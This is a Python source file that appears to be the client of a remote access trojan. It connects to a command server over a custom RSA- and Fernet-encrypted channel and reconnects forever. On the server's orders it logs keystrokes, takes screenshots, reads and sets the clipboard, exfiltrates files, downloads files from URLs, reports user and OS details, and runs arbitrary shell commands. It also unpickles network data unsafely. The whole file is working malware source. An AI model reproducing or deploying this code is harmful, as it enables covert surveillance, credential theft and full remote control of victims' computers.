import logging
import os
import pickle
import platform
import socket
import subprocess
import threading
import time

import psutil
import pyperclip
import pyscreeze
import requests
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa
try:
    from pynput.keyboard import Key, Listener
    _pynput = True
except Exception as e:
    _pynput = False

logging.basicConfig(level=logging.CRITICAL)

def Hasher(MESSAGE : bytes):
    """ Hashes data """
    digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
    digest.update(MESSAGE)
    return digest.finalize()

def verifySignature(publicKey, signature, message):
    """ Verify signature with public key """
    try:
        publicKey.verify(
            signature,
            message,
            padding.PSS(
                mgf=padding.MGF1(hashes.SHA256()),
                salt_length=padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256()
        )
        return True
    except:
        return False

def sign(privateKey, data):
    """ Sign data with private key """
    signature = privateKey.sign(
        data,
        padding.PSS(
            mgf=padding.MGF1(hashes.SHA256()),
            salt_length=padding.PSS.MAX_LENGTH
        ),
        hashes.SHA256()
    )
    return signature

def encrypt(publicKey, plaintext):
    """ Encrypt using public key """
    ciphertext = publicKey.encrypt(
        plaintext,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None)
    )
    return ciphertext

def decrypt(privateKey, ciphertext):
    """ Decrypt using private key """
    plaintext = privateKey.decrypt(
        ciphertext,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return plaintext

def public_bytes(publicKey):
    """ Get Public Key in Bytes """
    serializedPublic = publicKey.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    return serializedPublic

def kill(proc_pid):
    """ Kill Process by ID """
    process = psutil.Process(proc_pid)
    for proc in process.children(recursive=True):
        proc.kill()
    process.kill()

def OnKeyboardEvent(event):
    global KeyboardLogs

    try:
        KeyboardLogs
    except NameError:
        KeyboardLogs = ''

    if event == Key.backspace:
        KeyboardLogs += " [Bck] "
    elif event == Key.tab:
        KeyboardLogs += " [Tab] "
    elif event == Key.enter:
        KeyboardLogs += "\n"
    elif event == Key.space:
        KeyboardLogs += " "
    elif type(event) == Key:  # if the character is some other type of special key
        KeyboardLogs += " [" + str(event)[4:] + "] "
    else:
        KeyboardLogs += str(event)[1:len(str(event)) - 1]  # remove quotes around character

KeyListener = Listener(on_press=OnKeyboardEvent)


class Client(object):

    def __init__(self):
        self.serverHost = '127.0.0.1'
        self.serverPort = 9999
        self.socket = None

        self.Fer_key = Fernet.generate_key()
        logging.debug(self.Fer_key)
        self.Fer = Fernet(self.Fer_key)

        self.privateKey = rsa.generate_private_key(public_exponent=65537, key_size=4096, backend=default_backend())
        self.publicKey = self.privateKey.public_key()

    def socket_create(self):
        """ Create a socket """
        try:
            self.socket = socket.socket()
        except socket.error as e:
            logging.error("Socket creation error" + str(e))
            return
        return

    def socket_connect(self):
        """ Connect to a remote socket using RSA and agreeing on a AES key"""
        try:
            self.socket.connect((self.serverHost, self.serverPort))
        except socket.error as e:
            logging.error("Socket connection error: " + str(e))
            time.sleep(5)
            raise
        try:
            self.socket.send(public_bytes(self.publicKey))
            serverPublic = serialization.load_pem_public_key(self.socket.recv(20480), backend=default_backend())

            Hashed_Key = Hasher(self.Fer_key)
            Encrypted = encrypt(serverPublic, self.Fer_key)
            Hash_Encrypted = Hasher(Encrypted)
            Signature = sign(self.privateKey, Hashed_Key)
            Encrypted_Signature = sign(self.privateKey, Hash_Encrypted)

            data = pickle.dumps({'Hashed_Key': Hashed_Key, 'Encrypted': Encrypted, 'Hash_Encrypted': Hash_Encrypted, 'Signature': Signature, 'Encrypted_Signature': Encrypted_Signature})

            self.socket.send(str(len(data)).encode())
            self.socket.recv(4096)
            self.socket.send(data)
            self.socket.recv(4096)
            self.send(socket.gethostname().encode())
        except Exception as e:
            logging.error(e)

    def recvall(self, n):
        """ Helper function to recv n bytes or return None if EOF is hit
        :param n:
        :param conn:
        """
        # TODO: this can be a static method
        data = b''
        while len(data) < n:
            packet = self.socket.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data

    def receive(self):
        """ Receives Buffer Size and Data from Server Encrypted with AES """
        length = int(self.Fer.decrypt(self.socket.recv(2048)).decode())
        self.socket.send(b'<RECEIVED>')
        return self.Fer.decrypt(self.recvall(length))

    def send(self, data):
        """ Sends Buffer Size and Data to Server Encrypted with AES """
        encrypted = self.Fer.encrypt(data)
        self.socket.send(self.Fer.encrypt(str(len(encrypted)).encode()))
        self.socket.recv(1024)
        self.socket.send(encrypted)

    def receive_commands(self):
        """ Receives Commands from Server """
        while True:
            data = pickle.loads(self.receive())
            # data[0]: command
            # data[1]: data1
            # data[2]: data2
            # ...

            if data[0] == '--l':
                self.socket.send(b' ')
                continue

            if data[0] == '<LISTENING>':
                self.send(b'<DONE>')

            if data[0] == '--s':
                with open(data[1], 'wb') as f:
                    f.write(data[2])
                self.send(b'File Transfer Successful\n')
                continue

            if data[0] == '--d':
                try:
                    r = requests.get(data[1])
                    with open(data[2], 'wb') as f:
                        f.write(r.content)
                except Exception as e:
                    self.send('Error downloading file: {}\n'.format(str(e)).encode())
                    continue
                self.send(b'Download Successful\n')
                continue

            if data[0] == '--c':
                pyperclip.copy(data[1])
                self.send(b'<READY>')
                continue
            
            if data[0] == '--u':
                self.send('User: {}\nOS: {} {} ({})\n'.format(os.environ['USERNAME'], platform.system(), platform.release(), platform.platform()).encode())
                continue

            if data[0] == '--g':
                if platform.system() == 'Windows':
                    _file = '{}\\temp.png'.format(os.environ['TEMP'])
                else:
                    _file = '{}/temp.png'.format(os.environ['HOME'])
                pyscreeze.screenshot(_file)
                with open(_file, 'rb') as f:
                    self.send(f.read())
                os.remove(_file)
                continue

            if data[0] == '--k start':
                if not _pynput:
                    self.send(b'Keylogger is disabled due to import error.')

                if not KeyListener.running:
                    KeyListener.start()
                    self.send(b'Started Keylogger\n')
                    continue
                self.send(b'Keylogger already running\n')
                continue
                
            if data[0] == '--k dump':
                if not _pynput:
                    self.send(b'Keylogger is disabled due to import error.')
                global KeyboardLogs

                if not KeyListener.running:
                    self.send(b'<NOTRUNNING>')
                else:
                    self.send(KeyboardLogs.encode())
                continue
            
            if data[0] == '--k stop':
                if not _pynput:
                    self.send(b'Keylogger is disabled due to import error.')
                if KeyListener.running:
                    KeyListener.stop()
                    threading.Thread.__init__(KeyListener) # re-initialise thread
                    KeyboardLogs = ''
                    self.send(b'Keylogger Stopped')
                    continue
                self.send(b'Keylogger not running')
                continue

            if data[0] == '--p':
                self.send(pyperclip.paste().encode())
                continue

            if data[0] == '--r':
                filename = data[1]
                if not os.path.exists(filename):
                    self.send(b'<TRANSFERERROR>')
                    continue
                with open(filename, 'rb') as f:
                    self.send(f.read())
                continue

            if data[0][:2].lower() == 'cd':
                try:
                    directory = data[0][3:]
                    os.chdir(directory.strip())
                except Exception as e:
                    logging.debug('Error changing cd: {}'.format(str(e)))
                self.send(os.getcwd().encode())
                continue

            if len(data[0]) > 0:
                if data[0] == 'tree':
                    data[0] = 'tree /A'
                process = subprocess.Popen(data[0], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                for line in iter(process.stdout.readline, ""):
                    if line == b'':
                        break
                    self.send(line.replace(b'\n', b''))
                    if self.receive() == '--q':
                        kill(process.pid)
                        break
                self.send(b'<DONE>')
                continue

def main():
    """ Run Client """
    client = Client()
    client.socket_create()
    while True:
        try:
            client.socket_connect()
        except:
            time.sleep(5)
        else:
            break
    try:
        client.receive_commands()
    except Exception as e:
        logging.critical('Error in main: {}'.format(str(e)))
    

if __name__ == '__main__':
    while 1:
        main()
